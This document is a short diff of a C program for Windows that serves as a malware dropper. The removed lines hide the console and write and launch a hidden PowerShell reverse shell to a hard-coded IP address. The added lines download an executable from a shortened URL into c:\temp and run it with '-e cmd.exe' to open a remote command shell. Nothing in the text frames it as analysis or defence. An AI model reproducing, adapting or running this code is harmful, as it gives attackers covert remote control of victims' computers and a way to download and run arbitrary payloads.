@@ -1,15 +1,9 @@
-#include <stdio.h>
-#include <winsock2.h>
-#include <windows.h>
+#include<windows.h>
+#include<string.h>
+#include<stdio.h>
 
-int main(int argc, char *argv[])
-{
-  ShowWindow (GetConsoleWindow(), SW_HIDE);
+int main() {
 
-   char command[5100];
-
-strcpy(command, "echo $client = New-Object System.Net.Sockets.TCPClient(\"159.89.214.31\",serveo_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535^|%{0};while(($i ^= $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data ^= (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback ^= (iex $data 2^>^&1 ^| Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() > %USERPROFILE%\\rs.ps1 & start /b /min powershell -NoExit -ExecutionPolicy ByPass -windowstyle hidden -File %USERPROFILE%\\rs.ps1");
-system(command);
-return 0;
+      system("cmd.exe /c mkdir c:\\temp 2> NUL & echo ^[Net.ServicePointManager^]::SecurityProtocol ^= ^[Net.SecurityProtocolType^]::Tls12 > c:\\temp\\b.ps1 & echo (wget 'https://tinyurl.com/y88r9epk' -OutFile c:\\temp\\a.exe) >> c:\\temp\\b.ps1 & cmd.exe /c powershell -ExecutionPolicy ByPass -File c:\\temp\\b.ps1 & START /MIN c:\\temp\\a.exe payload_server payload_port -e cmd.exe -d & exit");
+      return 0;
 }
-
